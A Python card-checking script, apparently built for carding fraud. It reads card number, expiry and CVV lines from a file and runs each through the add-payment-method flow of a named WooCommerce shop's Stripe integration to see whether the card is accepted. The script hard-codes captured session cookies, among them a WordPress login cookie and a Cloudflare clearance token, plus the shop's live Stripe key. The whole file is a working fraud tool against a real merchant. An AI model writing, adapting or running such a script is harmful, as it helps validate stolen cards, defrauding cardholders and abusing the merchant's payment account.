import re
import requests

# Constants for the HTTP requests
GET_COOKIES = {
    '__cf_bm': 'crCiUYWF6Mg1RiEKR0iMgPJQPupvusswIdfzCSfm5r8-1751216342-1.0.1.1-HYHpTaP0kFucjFGtW6MkPQ.wH3EbZfVhWDhM86NpAhqU8YKyEFJh5WsKC53UaXGyBK_NQyAibEoWMtKb_3PDt.yryzo8QeiTH1cB.rfqIO4',
    '_gcl_au': '1.1.1143473863.1751216344',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-06-29%2016%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdogearedbooksames.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-06-29%2016%3A59%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdogearedbooksames.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Safari%2F537.36',
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    'cf_clearance': 'sU_wrhtWGaIFJUdXePlhFPFLjhRb3kMZLk1mMqHPwUM-1751216344-1.2.1.1-WT5eM8CQpr8I76B.qhDcMaLAaeGk1w_q_82JJvDin6yQx0RQjF9T2RITyN.bYazN2PgxDZZDnzhscxMaEog6QJVW0GXAYTlv0IRTtqCXNCkSueSyIFxFKcS3TCJwosFfnYHcoUeMH54UDFhV8B1n1DvwNF3vxshU5T3q_YXC53FMm3OjwA5w6LCxyM7.Vj.BEENwtQ61otFgFjzx3H72j9B8xvFppmHDEOGeqlLU3rWUkT822LkmbC.81jXBgHoL4rNoTSeBR2_rJt6FnmPl4DH6OL.GSAz2XFc9yBe.lhxZMMKu_.WonvxQTfdBLssYLZX.aqL.._3O70M_vWk8C9aXCddPRBuBYTWZGZ..7Fk',
    'wordpress_logged_in_f4b4fe27dcb8fb3633461d7b333aaa29': 'elonklark0%7C1752425977%7CXuSCKDUA2eGf64XPxgAb3PPOjqffNBvu0XlQUvG2Uzv%7Ca60b95a936ec6412294422cca937065cb390e735a0f1c920ffb602e16319164d',
    'tk_ai': 'aJjy8zvwNK986Glr9fOS3ctg',
    '__stripe_mid': 'fe0b2187-d11b-4f98-90ec-337f0ca0a42ccaa52c',
    '__stripe_sid': '6767365e-9fae-46cc-ba77-fa80de634db1bea748',
    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdogearedbooksames.com%2Fmy-account%2Fpayment-methods%2F',
    'tk_qs': '',
}

GET_HEADERS = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://dogearedbooksames.com/my-account/payment-methods/',
    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

STRIPE_HEADERS = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
}

FINAL_COOKIES = {
    '__cf_bm': GET_COOKIES['__cf_bm'],
    '_gcl_au': GET_COOKIES['_gcl_au'],
    'sbjs_migrations': GET_COOKIES['sbjs_migrations'],
    'sbjs_current_add': GET_COOKIES['sbjs_current_add'],
    'sbjs_first_add': GET_COOKIES['sbjs_first_add'],
    'sbjs_current': GET_COOKIES['sbjs_current'],
    'sbjs_first': GET_COOKIES['sbjs_first'],
    'sbjs_udata': GET_COOKIES['sbjs_udata'],
    'tk_or': GET_COOKIES['tk_or'],
    'tk_r3d': GET_COOKIES['tk_r3d'],
    'tk_lr': GET_COOKIES['tk_lr'],
    'cf_clearance': GET_COOKIES['cf_clearance'],
    'wordpress_logged_in_f4b4fe27dcb8fb3633461d7b333aaa29': GET_COOKIES['wordpress_logged_in_f4b4fe27dcb8fb3633461d7b333aaa29'],
    'tk_ai': GET_COOKIES['tk_ai'],
    '__stripe_mid': GET_COOKIES['__stripe_mid'],
    '__stripe_sid': GET_COOKIES['__stripe_sid'],
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdogearedbooksames.com%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
}

FINAL_HEADERS = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://dogearedbooksames.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dogearedbooksames.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

PARAMS = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}

NONCE_PATTERN = r'"createAndConfirmSetupIntentNonce":\s*"([a-f0-9]+)"'


def check_card(card_line: str) -> str:
    number, month, year, cvv = card_line.strip().split('|')

    # 1st request to get nonce
    resp = requests.get(
        'https://dogearedbooksames.com/my-account/add-payment-method/',
        cookies=GET_COOKIES,
        headers=GET_HEADERS,
    )
    match = re.search(NONCE_PATTERN, resp.text)
    if not match:
        return 'Nonce not found'
    nonce = match.group(1)

    # 2nd request to Stripe
    stripe_data = {
        'type': 'card',
        'card[number]': number,
        'card[cvc]': cvv,
        'card[exp_year]': year[-2:],
        'card[exp_month]': month,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'BD',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/7c7e495c02; stripe-js-v3/7c7e495c02; payment-element; deferred-intent',
        'referrer': 'https://dogearedbooksames.com',
        'time_on_page': '29851',
        'client_attribution_metadata[client_session_id]': 'f20c548c-defa-45a4-9811-34aa02c35618',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': 'efe32618-0b36-4139-bb17-5f433314cd48f0c974',
        'muid': 'fe0b2187-d11b-4f98-90ec-337f0ca0a42ccaa52c',
        'sid': '6767365e-9fae-46cc-ba77-fa80de634db1bea748',
        'key': 'pk_live_51LdF32ElrZaQyEQMY3nyuLZPbY7yV96Bp6SMdnSmpPPbVM0pKqnxEDk8qabZR72C0LnLM7JGJB8H2fhWi0WYtQyF00ZOAtJWw4',
        '_stripe_version': '2024-06-20',
        'radar_options[hcaptcha_token]': '1',
    }
    stripe_resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=STRIPE_HEADERS, data=stripe_data)
    pm_id = stripe_resp.json().get('id')

    # 3rd request to finalize
    final_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    final_resp = requests.post(
        'https://dogearedbooksames.com/',
        params=PARAMS,
        cookies=FINAL_COOKIES,
        headers=FINAL_HEADERS,
        data=final_data,
    )
    try:
        result = final_resp.json().get('message')
        if result is None:
            result = final_resp.text
    except ValueError:
        result = final_resp.text
    return result


if __name__ == '__main__':
    with open('cc.txt') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                result = check_card(line)
            except Exception as exc:
                result = f'Error: {exc}'
            print(f'{line} - {result}')
